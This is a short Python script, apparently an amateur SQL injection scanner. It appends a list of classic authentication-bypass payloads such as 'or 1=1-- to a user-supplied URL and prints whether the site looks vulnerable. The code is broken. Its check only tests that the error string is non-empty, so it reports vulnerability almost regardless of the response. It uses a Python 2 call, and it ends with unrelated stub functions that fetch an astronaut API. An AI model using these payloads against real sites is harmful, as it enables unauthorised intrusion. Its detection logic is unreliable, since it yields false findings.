"""




"""
import requests

import sys
import urllib

from testXSS import raw_input

fullurl = raw_input("Url: ")
errormsg = "You have an error in your SQL syntax"
payloads = ["'admin'or 1=1 or ''='", "'=1\' or \'1\' = \'1\'", "'or 1=1", "'1 'or' 1 '=' 1", "'or 1=1#", "'0 'or' 0 '=' 0", "'admin'or 1=1 or ''='", "'admin' or 1=1", "'admin' or '1'='1", "'or 1=1/*", "'or 1=1--"] #whatever payloads you want here ## YOU CAN ADD YOUR OWN
errorr = "yes"
for payload in payloads:
    try:
        payload = payload
        resp = urllib.urlopen(fullurl + payload)
        body = resp.read()
        fullbody = body.decode('utf-8')
    except:
        print ("[-] Error! Manually check this payload: " + payload)
        errorr = "no"
        #sys.exit()
    if errormsg:
        if errorr == "no":
            print ("[-] That payload might not work!")
            errorr = "yes"
        else:
            print ("[+] The website is SQL injection vulnerable! Payload: " + payload)
    else:
        print ("[-] The website is not SQL injection vulnerable!")

def simple_string():
    response = requests.get("http://api.open-notify.org/astros.json")
    print(response)


def get_pass():
    response = requests.get("http://api.open-notify.org/astros.json")
    print(response)


def insert_data():
    response = requests.get("http://api.open-notify.org/astros.json")
    print(response)
